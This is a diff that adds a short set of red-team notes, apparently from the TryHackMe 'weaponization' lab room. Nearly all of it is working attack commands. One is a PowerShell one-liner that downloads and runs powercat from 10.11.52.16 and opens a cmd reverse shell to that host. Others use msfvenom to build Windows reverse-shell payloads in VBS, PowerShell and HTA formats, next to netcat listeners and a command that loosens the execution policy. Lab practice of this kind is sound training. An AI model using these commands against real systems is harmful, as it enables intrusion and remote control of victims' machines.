@@ -1,0 +1,28 @@
+For Red Team
+
+PS C:\Users\thm> Get-ExecutionPolicy
+Restricted
+
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+
+git clone https://github.com/besimorhino/powercat.git
+ 
+ 
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.52.16:8000/powercat.ps1');powercat -c 10.11.52.16 -p 1337 -e cmd"
+
+
+
+msfvenom --list formats 
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.52.16 LPORT=4443 -f vbs -o thm.vbs
+nc -lnvp 4443
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.52.16 LPORT=4444 -f psh -o thm.ps1
+nc -lnvp 4444
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.52.16 LPORT=443 -f hta-psh -o thm.hta
+
+
+https://tryhackme.com/room/weaponization
